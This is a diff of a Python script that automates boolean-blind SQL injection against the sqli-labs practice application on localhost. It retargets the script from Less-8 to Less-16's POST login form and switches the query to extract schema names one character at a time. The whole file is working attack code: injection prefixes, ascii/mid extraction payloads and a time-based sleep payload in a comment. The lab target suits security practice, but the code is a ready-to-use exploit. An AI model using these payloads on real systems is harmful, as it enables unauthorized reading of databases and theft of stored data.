@@ -4,7 +4,7 @@ import requests
 # inject_type = bool_blind
 def sql_inject_payload(limit_len,str_len,ascii_str):
 
-    pre_inject_str = "-1'"
+    pre_inject_str = '1")'
     suf_inject_str = "#"
     #    查询数据库语句
     schema_sql_sequence = f"select schema_name from information_schema.SCHEMATA"
@@ -19,18 +19,18 @@ def sql_inject_payload(limit_len,str_len,ascii_str):
     select_content_sql_sequence = f"select concat({table_columns}) from {table_name}"
 
     # print(table_sql_sequence)
-    poc = f'{pre_inject_str} or (ascii(mid(({select_content_sql_sequence} limit {limit_len},1),{str_len},1))>{ascii_str}) {suf_inject_str}'
+    poc = f'{pre_inject_str} or (ascii(mid(({schema_sql_sequence} limit {limit_len},1),{str_len},1))>{ascii_str}) {suf_inject_str}'
     return poc
 # url: http://localhost/sqli-labs/Less-8/?id=1' and if(ascii(mid((select database()),1,1))>11,sleep(5),1) %23
 def connect(limit_len,str_len,ascii_str):
 
-    url = "http://localhost/sqli-labs/Less-8/"
-    poc = sql_inject_payload(limit_len,str_len,ascii_str)
-    parms = {'id':poc}
-    result = requests.get(url=url,params=parms)
+    url = "http://localhost/sqli-labs/Less-16/"
+    exp = sql_inject_payload(limit_len,str_len,ascii_str)
+    parms = {'uname': exp,'passwd':'admin','submit':'Submit'}
+    result = requests.post(url=url,data=parms)
+    # print(parms)
     html_result = result.text
-
-    key_string = "You are in"
+    key_string = "flag"
     if key_string in html_result:
         return True
     else:
